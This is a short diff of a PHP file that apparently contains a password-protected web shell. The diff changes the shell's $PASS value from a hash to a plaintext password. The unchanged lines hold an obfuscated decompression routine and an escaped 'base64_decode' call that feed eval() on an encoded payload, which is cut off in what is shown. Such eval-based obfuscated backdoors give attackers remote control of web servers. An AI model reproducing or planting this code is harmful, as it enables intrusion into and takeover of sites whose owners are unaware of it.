@@ -1,5 +1,5 @@
 <?php
-$PASS="caf2d9f13aec086dba40defb3f844872";
+$PASS="290802as";
 function Qo($GG) { $OT = 256; $PA = 8; $bh = array(); $LV = 0; $vR = 0; for ($cD = 0; $cD < strlen($GG); $cD++) { $LV = ($LV << 8) + ord($GG[$cD]); $vR += 8; if ($vR >= $PA) { $vR -= $PA; $bh[] = $LV >> $vR; $LV &= (1 << $vR) - 1; $OT++; if ($OT >> $PA) { $PA++; } } } $YX = range("\0", "\xff"); $Qi = ''; foreach ($bh as $cD => $QN) { if (!isset($YX[$QN])) { $aA = $e8 . $e8[0]; } else { $aA = $YX[$QN]; } $Qi .= $aA; if ($cD) { $YX[] = $e8 . $aA[0]; } $e8 = $aA; } return $Qi; } 
 $_GTPAjq="\x62\141\x73\145\66\x34\137\144\x65\143\x6f\144\145";eval(Qo($_GTPAjq("aTMKBCaTmczKdBQJCgQSmUxSKT2IIVDCmIB6IBEORsMDMYRkMBiMDKZBsNhiYjMMo8YTKOTCNzKY
 xqMBwOBuMhEOxAfYk4ksmIsIDocjqZZ0JJ8nKCJyqVCMLRwJ6PPk1SyMaTYZTmTTCbqlPUsmaCbT
